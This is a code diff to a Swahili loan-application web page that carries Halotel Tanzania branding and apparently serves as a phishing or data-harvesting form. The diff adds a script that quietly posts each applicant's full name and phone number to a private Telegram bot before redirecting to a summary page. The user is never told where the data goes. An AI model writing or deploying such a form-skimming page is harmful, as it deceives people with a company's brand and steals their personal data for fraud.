@@ -224,7 +224,6 @@
         .next-btn:hover {
             opacity: 0.95;
         }
-        /* Message Banner Styling */
         
         .toast-banner {
             display: none;
@@ -304,9 +303,6 @@
             </div>
         </div>
 
-        <label class="form-label" for="email">Anwani ya Barua Pepe (Email)</label>
-        <input type="email" class="form-input" id="email" placeholder="juma.ali@example.com" style="margin-bottom:20px;">
-
         <label class="form-label" for="phone">Nambari ya Simu</label>
         <div class="phone-group" id="phoneGroup">
             <span class="phone-prefix">+255</span>
@@ -323,6 +319,10 @@
     <footer>© 2026 Halotel Tanzania. Haki zote zimehifadhiwa.</footer>
 
     <script>
+        // TELEGRAM BOT CONFIGURATION
+        const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+
         function showBanner(message, type = 'error') {
             const banner = document.getElementById('toastBanner');
             banner.className = `toast-banner toast-${type}`;
@@ -342,7 +342,6 @@
         // Load pre-filled data if exists
         if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
         if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
-        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
         if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
 
         // Navigation actions
@@ -355,12 +354,11 @@
         });
 
         // Form submission handling & redirection to summary.html
-        document.getElementById('nextBtn').addEventListener('click', function() {
+        document.getElementById('nextBtn').addEventListener('click', async function() {
             hideBanner();
 
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
-            const email = document.getElementById('email').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
             // Reset error highlights
@@ -376,10 +374,6 @@
                 document.getElementById('lastName').classList.add('invalid');
                 errors.push('Jina la mwisho linahitajika');
             }
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                document.getElementById('email').classList.add('invalid');
-                errors.push('Barua pepe si sahihi');
-            }
             if (!phone || phone.length !== 9 || !/^\d+$/.test(phone)) {
                 document.getElementById('phoneGroup').classList.add('invalid');
                 errors.push('Nambari ya simu lazima iwe na tarakimu 9');
@@ -393,12 +387,30 @@
             // Save form values to localStorage
             localStorage.setItem('firstName', firstName);
             localStorage.setItem('lastName', lastName);
-            localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
+
+            // Send notification to Telegram
+            const messageText = `📩 *Ombi Jipya la Mkopo*\n\n👤 *Jina:* ${firstName} ${lastName}\n📱 *Simu:* +255${phone}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram notification error:', error);
+            }
 
             showBanner('✔ Taarifa zimehifadhiwa kikamilifu! Unahamishiwa...', 'success');
 
-            // Redirect to summary.html after a brief delay so the user sees the success message
+            // Redirect to summary.html after sending
             setTimeout(() => {
                 window.location.href = 'summary.html';
             }, 1000);
